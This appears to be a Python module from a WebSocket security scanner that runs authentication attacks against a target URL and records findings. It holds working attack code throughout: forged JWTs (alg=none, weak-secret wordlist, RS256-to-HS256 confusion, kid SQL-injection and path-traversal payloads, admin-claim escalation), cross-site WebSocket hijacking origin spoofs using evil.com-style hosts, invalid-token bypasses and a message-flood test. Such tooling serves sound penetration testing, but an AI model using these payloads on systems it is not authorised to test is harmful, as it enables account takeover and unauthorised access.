"""
Authentication Attack Module
JWT, CSWSH, Auth Bypass, Session — evidence-based, no false positives
"""
import asyncio
import base64
import json
import hmac
import hashlib
import re
import ssl
import time
import websockets
from core.scanner import ws_connect, send_recv
from core.findings import store
from utils.evidence import Evidence
from utils.logger import log


# ── JWT helpers ───────────────────────────────────────────────────────────────

def b64url_enc(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_dec(s):
    return base64.urlsafe_b64decode(s + '=' * (4 - len(s) % 4))

def parse_jwt(token):
    try:
        parts = token.split('.')
        if len(parts) != 3: return None, None
        return (json.loads(b64url_dec(parts[0])),
                json.loads(b64url_dec(parts[1])))
    except Exception:
        return None, None

def craft_jwt(header, payload, secret='', alg='HS256'):
    h = b64url_enc(json.dumps(header, separators=(',', ':')))
    p = b64url_enc(json.dumps(payload, separators=(',', ':')))
    signing = f"{h}.{p}"
    if alg.lower() == 'none':
        return f"{signing}."
    alg_map = {'HS256': hashlib.sha256, 'HS384': hashlib.sha384, 'HS512': hashlib.sha512}
    if alg in alg_map:
        sig = hmac.new(
            secret.encode() if isinstance(secret, str) else secret,
            signing.encode(), alg_map[alg]
        ).digest()
        return f"{signing}.{b64url_enc(sig)}"
    return f"{signing}."

WEAK_SECRETS = [
    # Common passwords
    'secret', 'password', '123456', 'qwerty', 'admin', 'jwt_secret',
    'your-256-bit-secret', 'mysecret', 'supersecret', 'secret123',
    'key', 'changeme', 'default', 'test', 'dev', 'jwt', 'token',
    'hello', 'world', '1234', 'master', 'root', 'pass123', 'admin123',

    # New additions — common in real apps
    'secretkey', 'jwtkey', 'jwt-secret', 'app_secret', 'app-secret',
    'mysecretkey', 'privatekey', 'private_key', 'signing_key',
    'access_token_secret', 'refresh_token_secret', 'auth_secret',
    'flask_secret', 'django_secret', 'rails_secret', 'node_secret',
    '12345678', '123456789', '1234567890', 'password123', 'admin1234',
    'letmein', 'welcome', 'monkey', 'dragon', 'master123',
    'secret_key_here', 'your_secret_key', 'change_me_please',
    'production_secret', 'staging_secret', 'development_secret',
    '', 'null', 'undefined', 'none', 'test123', 'guest',
]

# Keep this list *strict* to avoid false positives from generic banners
# that always include "welcome" or "user" fields even when auth failed.
AUTH_SUCCESS_SIGNALS = [
    '"success":true',
    '"logged_in":true',
    '"auth":true',
    '"authenticated":true',
    'token accepted',
    'login success',
    'access granted',
    'authorized',
    '"status":"ok"',
]


async def _try_token(ws_url: str, token: str, label: str) -> tuple[bool, str]:
    """Try JWT via URL param + Authorization header + message body"""
    from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

    # Method 1: URL query param
    parsed = urlparse(ws_url)
    for param in ['token', 'access_token', 'jwt', 'auth']:
        qs = dict(parse_qs(parsed.query))
        qs[param] = [token]
        url_with_token = urlunparse(parsed._replace(
            query='&'.join(f"{k}={v[0]}" for k, v in qs.items())
        ))
        for headers in [
            {'Authorization': f'Bearer {token}'},
            {'Authorization': token},
            {},
        ]:
            for msg in [
                json.dumps({'token': token}),
                json.dumps({'authorization': token}),
                json.dumps({'type': 'auth', 'token': token}),
                '{"type":"ping"}',
            ]:
                try:
                    async with await ws_connect(url_with_token, headers=headers, timeout=4) as ws:
                        resp = await send_recv(ws, msg, timeout=3)
                        if resp:
                            resp_lower = resp.lower()
                            if any(s in resp_lower for s in AUTH_SUCCESS_SIGNALS):
                                return True, resp
                except Exception:
                    pass
    return False, ''


async def test_cswsh(ws_url: str) -> bool:
    """
    Advanced Cross-Site WebSocket Hijacking (CSWSH)
    Tests 8+ Origin bypass techniques used by real-world bug bounty hunters.
    Only flags confirmed bypasses where sensitive data is exposed.
    """
    from urllib.parse import urlparse

    ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE

    parsed = urlparse(ws_url)
    target_host = parsed.hostname or 'localhost'
    # Strip 'www.' prefix for building bypass origins
    base_domain = target_host.lstrip('www.') if target_host.startswith('www.') else target_host

    # ── Build Origin bypass list ──────────────────────────────────────────
    bypass_origins = [
        # (Origin value, technique label, severity_boost)
        ('https://evil-attacker.com',                           'Foreign Origin',           False),
        ('null',                                                'Null Origin (iframe)',       True),
        (f'https://evil.{base_domain}',                         'Subdomain Spoof',           True),
        (f'https://{base_domain}.evil.com',                     'Domain as Subdomain',       True),
        (f'https://evil{base_domain}',                          'Suffix Match Bypass',       True),
        (f'http://{target_host}',                               'Scheme Downgrade (HTTP)',    True),
        (f'https://evil.com/{base_domain}',                     'Origin-in-Path',            True),
        (f'https://{target_host.upper()}',                      'Case Variation',           False),
        (f'https://{base_domain}%00.evil.com',                  'Null Byte in Origin',       True),
        (f'https://{base_domain}@evil.com',                     'Credential Injection',      True),
    ]

    sensitive_patterns = [
        r'"user":', r'"email":', r'"token":', r'"session":', r'"id":\s*\d+',
        r'"balance":', r'"role":', r'"account":', r'"profile":',
        r'"data":\s*\{', r'"message":', r'authenticated', r'welcome',
    ]

    # ── First: get baseline (legitimate origin) response ──────────────────
    baseline_resp = None
    legit_origin = f'https://{target_host}'
    try:
        async with websockets.connect(
            ws_url, open_timeout=5,
            additional_headers={'Origin': legit_origin},
            ssl=ssl_ctx if ws_url.startswith('wss') else None,
        ) as ws:
            baseline_resp = await send_recv(ws, '{"type":"ping"}', timeout=3)
    except Exception:
        pass

    # ── Test each bypass technique ────────────────────────────────────────
    bypasses_found = []
    no_origin_headers = {}

    for origin_val, technique, is_advanced in bypass_origins:
        try:
            headers = {}
            if origin_val == 'null':
                headers['Origin'] = 'null'
            elif origin_val:
                headers['Origin'] = origin_val

            async with websockets.connect(
                ws_url, open_timeout=5,
                additional_headers=headers,
                ssl=ssl_ctx if ws_url.startswith('wss') else None,
            ) as ws:
                resp = await send_recv(ws, '{"type":"ping"}', timeout=3)
                if resp:
                    has_sensitive = any(
                        re.search(p, resp, re.IGNORECASE)
                        for p in sensitive_patterns
                    )
                    bypasses_found.append({
                        'origin': origin_val,
                        'technique': technique,
                        'response': resp[:300],
                        'sensitive': has_sensitive,
                        'is_advanced': is_advanced,
                    })
        except websockets.exceptions.InvalidHandshake:
            # Server rejected — this origin check works
            pass
        except Exception:
            pass

    if not bypasses_found:
        return False

    # ── Report findings ───────────────────────────────────────────────────
    # Priority 1: Advanced bypass + sensitive data = CRITICAL
    critical_bypasses = [b for b in bypasses_found if b['is_advanced'] and b['sensitive']]
    if critical_bypasses:
        b = critical_bypasses[0]
        all_techniques = ', '.join(bp['technique'] for bp in critical_bypasses)
        ev = Evidence.make(
            payload=f"Origin: {b['origin']}",
            request=f"WS Connect with Origin: {b['origin']}",
            response=b['response'],
            proof=f"Origin validation bypassed via {b['technique']} — sensitive data exposed",
            reproduce=(
                f"1. Create malicious HTML page with:\n"
                f"   <script>var ws = new WebSocket('{ws_url}');</script>\n"
                f"2. Host page on domain matching: {b['origin']}\n"
                f"3. Serve to victim, WebSocket connects cross-origin\n"
                f"4. Sensitive data from server is captured"
            ),
            bypasses_found=len(critical_bypasses),
            techniques=all_techniques,
        )
        store.add(ws_url, 'Advanced CSWSH — Origin Bypass (Critical)', 'CRITICAL',
            f"Origin validation bypassed using {b['technique']}.\n"
            f"Server returned sensitive data to spoofed origin.\n"
            f"Total bypass techniques found: {len(critical_bypasses)}\n"
            f"Techniques: {all_techniques}", ev)
        return True

    # Priority 2: Advanced bypass + no sensitive data = HIGH
    advanced_bypasses = [b for b in bypasses_found if b['is_advanced']]
    if advanced_bypasses:
        b = advanced_bypasses[0]
        all_techniques = ', '.join(bp['technique'] for bp in advanced_bypasses)
        ev = Evidence.make(
            payload=f"Origin: {b['origin']}",
            response=b['response'],
            proof=f"Origin validation bypassed via {b['technique']} — no sensitive data yet",
            reproduce=(
                f"1. Connect to {ws_url} with Origin: {b['origin']}\n"
                f"2. Server accepts connection despite spoofed origin\n"
                f"3. Further exploitation may expose sensitive data"
            ),
            bypasses_found=len(advanced_bypasses),
            techniques=all_techniques,
        )
        store.add(ws_url, 'CSWSH — Origin Validation Bypass', 'HIGH',
            f"Origin validation can be bypassed using {len(advanced_bypasses)} technique(s).\n"
            f"Techniques: {all_techniques}\n"
            f"No sensitive data exposed in initial probe, but further exploitation possible.", ev)
        return True

    # Priority 3: Only basic foreign origin accepted + sensitive data = HIGH
    sensitive_basic = [b for b in bypasses_found if b['sensitive'] and not b['is_advanced']]
    if sensitive_basic:
        b = sensitive_basic[0]
        ev = Evidence.make(
            payload=f"Origin: {b['origin']}",
            request=f"WS Connect with Origin: {b['origin']}",
            response=b['response'],
            proof='Server returned sensitive data to cross-origin request',
            reproduce=(
                f"1. Open browser console on any website\n"
                f"2. Run: var ws = new WebSocket('{ws_url}');\n"
                f"3. ws.onmessage = e => console.log(e.data);\n"
                f"4. Observe sensitive user data returned"
            ),
        )
        store.add(ws_url, 'Cross-Site WebSocket Hijacking (CSWSH)', 'HIGH',
            f"Server accepted cross-origin connection and returned sensitive data.\n"
            f"Any website can connect and steal user data.", ev)
        return True

    # Priority 4: Foreign origin accepted but no sensitive data = LOW
    ev = Evidence.make(
        payload=f"Origins tested: {len(bypasses_found)}",
        response=bypasses_found[0]['response'][:200],
        proof='Origin not validated but no sensitive data exposed',
    )
    store.add(ws_url, 'No Origin Validation (Low Risk)', 'LOW',
        f"Server accepted {len(bypasses_found)} cross-origin connection(s).\n"
        f"No sensitive data exposed — may be intentional for public APIs.", ev)
    return False


# ── JWT Algorithm Confusion (RS256 → HS256) ───────────────────────────────
async def _test_alg_confusion(ws_url: str, header: dict, payload: dict) -> bool:
    """
    Algorithm Confusion Attack:
    If server uses RS256 (asymmetric), try signing with HS256 using the
    PUBLIC key as the HMAC secret — some servers accept this.
    """
    if not header or header.get('alg') != 'RS256':
        return False

    test_secrets = [
        'public_key', 'rsa_public', '-----BEGIN PUBLIC KEY-----',
        'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A',  # Common RSA header
    ]

    for secret in test_secrets:
        crafted = craft_jwt({'alg': 'HS256', 'typ': 'JWT'}, payload, secret=secret, alg='HS256')
        ok, resp = await _try_token(ws_url, crafted, 'alg_confusion_RS256_to_HS256')
        if ok:
            ev = Evidence.make(
                payload=f"Changed alg from RS256 to HS256, signed with: '{secret}'",
                response=resp[:200],
                proof="Algorithm confusion attack: RS256 token accepted when re-signed as HS256",
                reproduce=(
                    f"1. Original JWT uses RS256\n"
                    f"2. Change header alg to HS256\n"
                    f"3. Sign with public key material as HMAC secret\n"
                    f"4. Server accepts the forged token"
                )
            )
            store.add(ws_url, 'JWT Algorithm Confusion (RS256\u2192HS256)', 'CRITICAL',
                "Server vulnerable to algorithm confusion attack.\n"
                "RS256 token accepted when re-signed as HS256.\n"
                "Attacker can forge any JWT claims.", ev)
            return True
    return False


# ── JWT KID (Key ID) Injection ──────────────────────────────────────────
async def _test_kid_injection(ws_url: str, header: dict, payload: dict) -> bool:
    """
    KID Injection Attack:
    The 'kid' header parameter specifies which key to use.
    If server uses kid in SQL/file lookup without sanitization:
      - SQL: kid = "' UNION SELECT 'hacked'--" → secret becomes 'hacked'
      - Path: kid = "../../dev/null" → empty secret
    """
    kid_payloads = [
        ("' UNION SELECT 'pwned'--",    'hacked', "SQL injection in kid"),
        ("'; SELECT 'pwned'--",         'hacked', "SQL kid injection v2"),
        ("0 UNION SELECT 'pwned'",      'hacked', "Numeric SQL kid injection"),
        ("../../dev/null",              '',       "Path traversal kid \u2192 empty secret"),
        ("../../../dev/null",           '',       "Path traversal kid v2"),
        ("/dev/null",                   '',       "Absolute path kid"),
    ]

    for kid_val, secret, label in kid_payloads:
        modified_header = {**(header or {'alg': 'HS256', 'typ': 'JWT'}), 'kid': kid_val}
        crafted = craft_jwt(modified_header, payload or {'user': 'admin', 'role': 'admin'},
                           secret=secret, alg='HS256')
        ok, resp = await _try_token(ws_url, crafted, f'kid_injection_{label}')
        if ok:
            ev = Evidence.make(
                payload=f"kid: {kid_val}",
                response=resp[:200],
                proof=f"KID injection confirmed: {label}. Server used attacker-controlled key.",
                reproduce=(
                    f"1. Craft JWT with kid header: '{kid_val}'\n"
                    f"2. Sign token with secret: '{secret or '(empty)'}\'"
                    f"\n3. Send to {ws_url}\n"
                    f"4. Server accepts token \u2014 KID injection confirmed"
                )
            )
            store.add(ws_url, 'JWT KID Injection', 'CRITICAL',
                f"JWT Key ID (kid) injection confirmed.\n"
                f"Attack: {label}\n"
                f"KID value used: {kid_val}\n"
                f"Attacker controls which key the server uses to verify token.", ev)
            return True
    return False


# ── JWT Expiry Validation Check ─────────────────────────────────────────
async def _test_expired_token(ws_url: str, header: dict, payload: dict) -> bool:
    """
    Test if server validates token expiry (exp claim).
    Create a token expired 1 year ago — if server accepts = vulnerability.
    """
    expired_payload = {
        **(payload or {}),
        'iat': int(time.time()) - 86400 * 365,
        'exp': int(time.time()) - 86400 * 365,
        'nbf': int(time.time()) - 86400 * 365,
    }

    for secret in WEAK_SECRETS[:10]:
        crafted = craft_jwt(
            header or {'alg': 'HS256', 'typ': 'JWT'},
            expired_payload,
            secret=secret,
            alg='HS256'
        )
        ok, resp = await _try_token(ws_url, crafted, 'expired_token')
        if ok:
            ev = Evidence.make(
                payload=f"Token expired 365 days ago (exp: {expired_payload['exp']})",
                response=resp[:200],
                proof="Server accepted JWT with exp claim 1 year in the past \u2014 no expiry validation",
                reproduce=(
                    f"1. Create JWT with exp = current_time - 1_year\n"
                    f"2. Sign with any valid secret\n"
                    f"3. Server accepts expired token"
                )
            )
            store.add(ws_url, 'JWT Expired Token Accepted', 'HIGH',
                "Server does not validate JWT expiry (exp claim).\n"
                "Tokens remain valid indefinitely after expiry.\n"
                "Stolen tokens can be used forever.", ev)
            return True
    return False


async def test_jwt_attacks(ws_url: str, fast_mode: bool = True) -> list:
    """JWT attack suite — only report confirmed bypasses"""
    results = []

    # First try to extract a JWT from the connection
    jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*'
    token = None

    try:
        async with await ws_connect(ws_url, timeout=5) as ws:
            for probe in ['{"type":"ping"}', '{"action":"connect"}', 'ping']:
                resp = await send_recv(ws, probe, timeout=2)
                if resp:
                    m = re.search(jwt_pattern, resp)
                    if m:
                        token = m.group()
                        log.info(f"JWT extracted from {ws_url}")
                        break
    except Exception:
        pass

    # Also check URL
    m = re.search(jwt_pattern, ws_url)
    if m:
        token = m.group()

    if not token:
        # No JWT found — create generic one for testing
        generic_payload = {
            'user': 'test', 'role': 'user',
            'iat': int(time.time()), 'exp': int(time.time()) + 3600
        }
        generic_header = {'alg': 'HS256', 'typ': 'JWT'}
    else:
        generic_header, generic_payload = parse_jwt(token)
        if not generic_header:
            return results
        log.info(f"Testing JWT: alg={generic_header.get('alg')}")

    # ── Attack 1: None Algorithm ──────────────────────────────────────────
    for none_val in ['none', 'None', 'NONE', '']:
        h = {**(generic_header or {}), 'alg': none_val}
        crafted = craft_jwt(h, generic_payload or {}, alg='none')
        ok, resp = await _try_token(ws_url, crafted, f'alg={none_val}')
        if ok:
            ev = Evidence.make(
                payload=crafted[:80],
                response=resp[:200],
                proof=f'Server accepted JWT with alg="{none_val}" (no signature)',
                reproduce=(
                    f"1. Take any JWT\n"
                    f"2. Change header alg to '{none_val}'\n"
                    f"3. Remove signature (set to empty)\n"
                    f"4. Connect to {ws_url} with this token\n"
                    f"5. Server accepts without signature verification"
                )
            )
            store.add(ws_url, 'JWT None Algorithm Bypass', 'CRITICAL',
                f"Server accepted unsigned JWT (alg=none).\n"
                f"Anyone can forge authentication tokens.", ev)
            results.append('jwt_none')
            return results  # Most critical — stop here

    # ── Attack 2: Weak Secret ─────────────────────────────────────────────
    alg = (generic_header or {}).get('alg', 'HS256')
    if alg in ('HS256', 'HS384', 'HS512'):
        secret_candidates = WEAK_SECRETS[:25] if fast_mode else WEAK_SECRETS
        for secret in secret_candidates:
            crafted = craft_jwt(generic_header, generic_payload or {}, secret=secret, alg=alg)
            ok, resp = await _try_token(ws_url, crafted, f'secret={secret}')
            if ok:
                ev = Evidence.make(
                    payload=f'secret: {secret}',
                    proof=f'JWT accepted when signed with weak secret: "{secret}"',
                    reproduce=(
                        f"1. Brute-force JWT secret with wordlist\n"
                        f"2. Found secret: '{secret}'\n"
                        f"3. Forge JWT with any payload\n"
                        f"4. Full auth bypass"
                    )
                )
                store.add(ws_url, 'JWT Weak Secret', 'CRITICAL',
                    f"JWT signed with guessable secret: '{secret}'.\n"
                    f"Attacker can forge any token.", ev)
                results.append('jwt_weak')
                return results

    # ── Attack 3: Privilege Escalation ────────────────────────────────────
    if generic_payload:
        escalated = {**generic_payload, 'role': 'admin', 'isAdmin': True, 'admin': True}
        crafted = craft_jwt(
            generic_header or {'alg': 'HS256', 'typ': 'JWT'},
            escalated, secret='', alg='HS256'
        )
        ok, resp = await _try_token(ws_url, crafted, 'privilege_escalation')
        if ok:
            ev = Evidence.make(
                payload=str(escalated)[:100],
                response=resp[:200],
                proof='Modified JWT claims accepted without signature verification',
            )
            store.add(ws_url, 'JWT Privilege Escalation', 'CRITICAL',
                f"Server accepted modified JWT claims without verifying signature.\n"
                f"Attacker can set role=admin.", ev)
            results.append('jwt_privesc')

    # ── Attack 4: Algorithm Confusion ──────────────────────────────
    if generic_header and generic_header.get('alg') == 'RS256':
        alg_found = await _test_alg_confusion(ws_url, generic_header, generic_payload)
        if alg_found:
            results.append('jwt_alg_confusion')

    # ── Attack 5: KID Injection ───────────────────────────────────
    if generic_header:
        kid_found = await _test_kid_injection(ws_url, generic_header, generic_payload)
        if kid_found:
            results.append('jwt_kid_injection')

    # ── Attack 6: Expired Token ───────────────────────────────────
    if not fast_mode and generic_payload:
        exp_found = await _test_expired_token(ws_url, generic_header, generic_payload)
        if exp_found:
            results.append('jwt_expired')

    return results


async def test_auth_bypass(ws_url: str) -> bool:
    """
    Auth bypass — only flag CONFIRMED bypasses
    Not just 'server responded' — server must confirm auth
    """
    suspicious_tokens = [
        ('eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.', 'JWT none-alg admin'),
        ('null', 'null string'),
        ('undefined', 'undefined'),
        ('Bearer ', 'empty bearer'),
    ]

    for token, label in suspicious_tokens:
        for headers in [
            {'Authorization': f'Bearer {token}'},
            {'Authorization': token},
        ]:
            try:
                async with await ws_connect(ws_url, headers=headers, timeout=4) as ws:
                    resp = await send_recv(ws, '{"type":"auth","test":true}', timeout=3)
                    if resp:
                        resp_lower = resp.lower()
                        # Only flag if server explicitly confirms authentication
                        if any(s in resp_lower for s in [
                            'authenticated', 'welcome', 'authorized',
                            '"success":true', '"logged_in":true', '"auth":true'
                        ]):
                            ev = Evidence.make(
                                payload=f'{label}: {token[:40]}',
                                response=resp[:200],
                                proof='Server explicitly confirmed authentication with invalid token',
                                reproduce=(
                                    f"1. Connect to {ws_url}\n"
                                    f"2. Set header: Authorization: Bearer {token}\n"
                                    f"3. Send: {{\"type\":\"auth\"}}\n"
                                    f"4. Server responds with auth success"
                                )
                            )
                            store.add(ws_url, f'Auth Bypass ({label})', 'CRITICAL',
                                f"Server authenticated with invalid token: {label}\n"
                                f"Response confirmed: {resp[:100]}", ev)
                            return True
            except Exception:
                pass
    return False


async def test_rate_limit(ws_url: str, fast_mode: bool = False) -> bool:
    """Rate limit — confirm with actual rejection, not just counting"""
    count = 25 if fast_mode else 80
    BLOCK_SIGNALS = ['rate limit', 'too many', 'blocked', 'throttle',
                     'slow down', '429', 'exceeded', 'connection closed']

    try:
        async with await ws_connect(ws_url, timeout=5) as ws:
            t0 = time.perf_counter()
            sent = 0
            blocked = False

            for i in range(count):
                try:
                    await ws.send('{"type":"ping"}')
                    sent += 1
                    resp = await asyncio.wait_for(ws.recv(), timeout=0.5)
                    if any(s in str(resp).lower() for s in BLOCK_SIGNALS):
                        blocked = True
                        break
                except asyncio.TimeoutError:
                    pass
                except Exception:
                    break  # Connection closed = rate limited

            elapsed = time.perf_counter() - t0
            rps = sent / max(elapsed, 0.01)

            if not blocked and sent >= count:
                ev = Evidence.make(
                    proof=f"Sent {sent} messages in {elapsed:.1f}s ({rps:.0f}/sec) — no rate limit",
                    reproduce=(
                        f"1. Connect to {ws_url}\n"
                        f"2. Send messages in a tight loop\n"
                        f"3. Server accepts all without throttling"
                    ),
                    messages_sent=sent,
                    time_seconds=round(elapsed, 2),
                    rate_per_sec=round(rps, 1)
                )
                store.add(ws_url, 'No Rate Limiting (DoS Risk)', 'MEDIUM',
                    f"Server accepted {sent} messages in {elapsed:.1f}s ({rps:.0f} msg/s).\n"
                    f"Vulnerable to message flood DoS.", ev)
                return True

    except Exception as e:
        log.debug(f"Rate limit test error: {e}")
    return False
